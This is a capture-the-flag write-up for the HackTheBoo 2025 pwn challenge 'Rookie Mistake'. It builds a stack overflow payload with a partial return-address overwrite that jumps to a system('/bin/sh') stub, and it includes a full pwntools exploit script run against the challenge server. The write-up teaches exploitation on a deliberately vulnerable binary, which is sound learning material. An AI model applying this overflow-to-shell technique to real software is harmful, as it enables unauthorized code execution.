---
title: "HackTheBoo CTF 2025 | Pwn: Rookie Mistake [easy]"
date: 2025-10-27
summary: "HackTheBoo 2025 CTF Pwn — Rookie-Mistake"
description: "Abusing a padding-only overflow to pivot main's return address onto the hidden win stub and pop a remote shell for the flag."
weight: 10
tags:
  - HackTheBox
  - HackTheBoo 2025
  - Pwn
  - ret2win
  - x86_64
categories:
  - HackTheBoo 2025
  - Pwn
draft: false
---

Rook — the fearless, reckless hunter — has become trapped within the binary during his attempt to erase NEMEGHAST. To set him free, you must align the cores and unlock his path back to the light. Failing that… find another way. Bypass the mechanism. Break the cycle. objective: Ret2win but not in a function, but a certain address.

## Step 1: Explore the Challenge Files

Identify the provided artifacts and the binary format.

```
ls
file rookie_mistake
cat README.txt
```

Findings:

- Single ELF named `rookie_mistake`, plus a themed README.
- 64-bit dynamically linked binary, **no PIE**, **NX enabled**, **stack canary disabled**, CET (IBT/SHSTK) on.

## Step 2: Baseline Runtime Behavior

Observe how the binary interacts with stdin/stdout.

```
./rookie_mistake
```

Output snippet:

```
【Gℓιт¢н Vσι¢є】Яοοқ... Μу ɓєℓονєɗ нυηтєя.. Aℓιgη тнє ¢οяєѕ.. Eѕ¢αρє!
rook@ie:~$ 【Gℓιт¢н Vσι¢є】Шɨʟʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶнɛ ƈѳяɛ ąŋɗ ɛʂƈąքɛ?!
```

Program reads from stdin once; any crash exits back to shell. No evidence of menuing or length checks—likely a single overflow.

## Step 3: Static Recon

Use pwntools/objdump to enumerate symbols and key functions.

```
from pwn import *
elf = ELF('rookie_mistake')
print('main', hex(elf.symbols['main']))
for name in ('banner','check_core','overflow_core','fail','setup'):
    func = elf.functions[name]
    print(f"{name}@{hex(func.address)} size {func.size}")
```

Highlights:

- `main` zeroes a 32-byte local buffer, prints ASCII art, then calls `read(0, buf, 0x2e)`.
- `check_core`/`overflow_core` compare six global “core” slots against user input; failing invokes `fail` (prints scolding text).
- `0x401758` is a short stub that loads the string `/bin/sh` from `.rodata` and jumps to `system@plt`—classic `win` gadget.

`strings` confirms `/bin/sh` at `0x4030a7`.

## Step 4: Measure the Overflow

Inspect `main`’s prologue to confirm stack layout.

```
objdump -d rookie_mistake --start-address=0x40176b --stop-address=0x4017d6
```

Key instructions:

- `sub rsp, 0x20` → local buffer is 0x20 bytes.
- After the `read` call there is no stack canary; returning uses the saved `rbp`/`rip` at offsets `+0x20` and `+0x28`.

Therefore payload structure: `[32 bytes padding][overwrite saved RBP][new RIP]`.

## Step 5: Local Proof of Concept

Craft payload and run locally to ensure the jump hits `system`.

```
from pwn import *
payload = b'A'*0x20 + b'B'*8 + p64(0x401758)[:6]
proc = process('./rookie_mistake')
proc.send(payload + b'id\n')
print(proc.recvline())
```

Notes:

- CET rejects 8-byte gadgets lacking ENDBR64, so partial overwrite (`[:6]`) keeps high bytes intact and lands exactly on `0x401758` which begins with ENDBR.
- After ret, banner still prints due to buffered output; patience is required.

## Step 6: The Exploit


```
from pwn import *
import time

context.binary = ELF('./rookie_mistake')
context.log_level = 'info'

HOST = '164.92.240.36'
PORT = 30498
WIN_ADDR = 0x401758
OFFSET = 0x20

payload = b'A' * OFFSET
payload += b'B' * 8
payload += p64(WIN_ADDR)[:6]

CMD = b'cat flag.txt || cat /flag'


def main():
    io = remote(HOST, PORT)
    io.sendline(payload)
    io.sendline(CMD)

    data = b''
    deadline = time.time() + 120
    while time.time() < deadline:
        chunk = io.recv(timeout=5)
        if not chunk:
            continue
        data += chunk
        if b'HTB{' in data:
            break

    start = data.index(b'HTB{')
    end = data.index(b'}', start)
    flag = data[start:end+1]
    log.success(flag.decode())
    with open('flag.txt', 'wb') as f:
        f.write(flag + b"\n")
    io.close()


if __name__ == '__main__':
    main()

```



- CET’s SHSTK/IBT do not hinder us because the entire thing is legitimate compiled code.
- The slow, sleep-laden `printstr` routine means `recvrepeat`/timeouts must be generous.


Run the exploit 

```
python3 exploit.py
```


```
[*] Opening connection to 164.92.240.36 on port 30498: Done
[*] Received 4146 bytes
[+] HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7}
```

## Takeaways

- Non-PIE binary + absent canary reduces exploit to straightforward ret2win despite CET being enabled.
- Partial-pointer overwrites remain handy for CET-hardened binaries where high bytes must remain canonical.
